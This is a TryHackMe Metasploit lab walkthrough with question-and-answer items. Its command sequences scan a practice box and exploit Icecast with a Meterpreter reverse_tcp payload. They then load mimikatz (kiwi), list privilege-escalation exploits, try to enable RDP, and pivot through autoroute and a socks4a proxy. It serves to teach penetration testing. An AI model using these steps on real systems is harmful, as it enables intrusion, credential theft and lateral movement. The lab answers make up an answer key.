# [Metasploit Room](https://tryhackme.com/room/rpmetasploit)

Website for metasploit (download and install): <https://www.metasploit.com/>

## Task 2

Q: We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'

A: -q

Q: Cool! We've connected to the database, which type of database does Metasploit 5 use?

A: postgresql

## Task 3

Q: The help menu has a very short one-character alias, what is it?

A: ?

Q: Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

A: search

Q: Once we've found the module we want to leverage, what command we use to select it as the active module?

A: use

Q: How about if we want to view information about either a specific module or just the active one we have selected?

A: info

Q: Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

A: connect

Q: Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

A: banner

Q: We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

A: set

Q: Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?

A: setg

Q: Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

A: get

Q: How about changing the value of a variable to null/no value?

A: unset

Q: When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

A: spool

Q: Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.

A: save

## Task 4

Q: Easily the most common module utilized, which module holds all of the exploit code we will use?

A: exploit

Q: Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

A: payload

Q: Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

A: auxiliary

Q: One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

A: post

Q: Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

A: encoder

Q: Last but not least, which module is used with buffer overflow and ROP attacks?

A: nop

Q: Not every module is loaded in by default, what command can we use to load different modules?

A: load

## Task 5

Machine IP - current list: 10.10.166.52

Q: Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command 'db_nmap -sV BOX-IP'

```sh
msf6 > db_nmap -sV 10.10.166.52
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-10 14:50 CET
[*] Nmap: Nmap scan report for 10.10.166.52
[*] Nmap: Host is up (0.049s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http               Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 64.79 seconds
msf6 > hosts
```

A: No answer needed

Q: What service does nmap identify running on port 135?

A: msrpc

Q: Let's go ahead and see what information we have collected in the database. Try typing the command 'hosts' into the msfconsole now.

```sh
msf6 > hosts

Hosts
=====

address       mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------       ---  ----  -------  ---------  -----  -------  ----  --------
10.10.166.52             Unknown                    device         

```

A: No answer needed

Q: How about something else from the database, try the command 'services' now.

```sh
msf6 > services
Services
========

host          port   proto  name               state  info
----          ----   -----  ----               -----  ----
10.10.166.52  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.166.52  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.166.52  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.166.52  3389   tcp    ssl/ms-wbt-server  open   
10.10.166.52  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.166.52  8000   tcp    http               open   Icecast streaming media server
10.10.166.52  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.166.52  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.166.52  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.166.52  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.166.52  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.166.52  49160  tcp    msrpc              open   Microsoft Windows RPC
```

A: No answer needed

Q: One last thing, try the command 'vulns' now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.

```sh
msf6 > vulns

Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------

msf6 > 
```

A: No answer needed

Q: Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type 'use' followed by a unique string found within only the target exploit. For example, try this out now with the following command 'use icecast'. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

```sh
msf6 > use icecast
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header

[*] Using exploit/windows/http/icecast_header
```

A: exploit/windows/http/icecast_header

While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command 'search multi/handler'.

Go ahead and run the command 'use NUMBER_NEXT_TO exploit/multi/handler` wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.

Q: What is the name of the column on the far left side of the console that shows up next to 'Name'?

A: #

Q: Now type the command 'use NUMBER_FROM_PREVIOUS_QUESTION'. This is the short way to use modules returned by search results.

No answer needed

Q: Next, let's set the payload using this command 'set PAYLOAD windows/meterpreter/reverse_tcp'. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command 'set LHOST YOUR_IP_ON_TRYHACKME'. You might have to check your IP using the command 'ip addr', it will likely be your tun0 interface.

A: No answer needed

Q: Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

A: No answer needed

Q: One last step before we can run our exploit. Run the command 'set RHOSTS BOX_IP' to tell Metasploit which target to attack.

A: No answer needed

Q: Once you're set those variables correctly, run the exploit now via either the command 'exploit' or the command 'run -j' to run this as a job.

A: No answer needed

Q: Once we've started this, we can check all of the jobs running on the system by running the command `jobs`

A: No answer needed

Q: After we've established our connection in the next task, we can list all of our sessions using the command `sessions`. Similarly, we can interact with a target session using the command `sessions -i SESSION_NUMBER`

A: No answer needed

## Task 6

Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage! Most of the questions in the following section can be answered by using the Meterpreter help menu which can be accessed through the 'help' command. This menu dynamically expands as we load more modules.

Q: First things first, our initial shell/process typically isn't very stable. Let's go ahead and attempt to move to a different process. First, let's list the processes using the command 'ps'. What's the name of the spool service?

A: spoolsv.exe

Q: Let's go ahead and move into the spool process or at least attempt to! What command do we use to transfer ourselves into the process? This won't work at the current time as we don't have sufficient privileges but we can still try!

A: migrate

Q: Well that migration didn't work, let's find out some more information about the system so we can try to elevate. What command can we run to find out more information regarding the current user running the process we are in?

A: getuid

Q: How about finding more information out about the system itself?

A: sysinfo

Q: This might take a little bit of googling, what do we run to load mimikatz (more specifically the new version of mimikatz) so we can use it?

A: load kiwi

Q: Let's go ahead and figure out the privileges of our current user, what command do we run?

A: getprivs

Q: What command do we run to transfer files to our victim computer?

A: upload

Q: How about if we want to run a Metasploit module?

A: run

Q: A simple question but still quite necessary, what command do we run to figure out the networking information and interfaces on our victim?

A: ipconfig

Q: Let's go ahead and run a few post modules from Metasploit. First, let's run the command `run post/windows/gather/checkvm`. This will determine if we're in a VM, a very useful piece of knowledge for further pivoting.

A: No answer needed

Q: Next, let's try: `run post/multi/recon/local_exploit_suggester`. This will check for various exploits which we can run within our session to elevate our privileges. Feel free to experiment using these suggestions, however, we'll be going through this in greater detail in the room `Ice`.

```sh
meterpreter > run post/windows/gather/checkvm

[*] Checking if DARK-PC is a Virtual Machine ...
[+] This is a Xen Virtual Machine
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.166.52 - Collecting local exploits for x86/windows...
[*] 10.10.166.52 - 36 exploit checks are being tried...
[+] 10.10.166.52 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.166.52 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.166.52 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
meterpreter > 
```

A: No answer needed

Q: Finally, let's try forcing RDP to be available. This won't work since we aren't administrators, however, this is a fun command to know about: `run post/windows/manage/enable_rdp`

A: No answer needed

Q: One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell?

A: shell

## Task 7

Makin' Cisco Proud

Last but certainly not least, let's take a look at the autorouting options available to us in Metasploit. While our victim machine may not have multiple network interfaces (NICs), we'll walk through the motions of pivoting through our victim as if it did have access to extra networks.

Q: Let's go ahead and run the command `run autoroute -h`, this will pull up the help menu for autoroute. What command do we run to add a route to the following subnet: 172.18.1.0/24? Use the -n flag in your answer.

A: run autoroute route -s 172.18.1.0 -n 255.255.255.0

Q: Additionally, we can start a socks4a proxy server out of this session. Background our current meterpreter session and run the command `search server/socks4a`. What is the full path to the socks4a auxiliary module?

A: auxiliary/server/socks4a

Q: Once we've started a socks server we can modify our /etc/proxychains.conf file to include our new server. What command do we prefix our commands (outside of Metasploit) to run them through our socks4a server with proxychains?

A: proxychains
